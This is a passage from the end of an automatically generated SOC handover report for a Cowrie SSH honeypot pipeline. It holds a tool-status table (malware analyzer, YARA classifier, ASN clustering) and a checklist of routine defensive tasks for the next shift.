| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 24 recon entry/entries in table (7 group(s) consolidating 66 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-03T20:34:38Z_
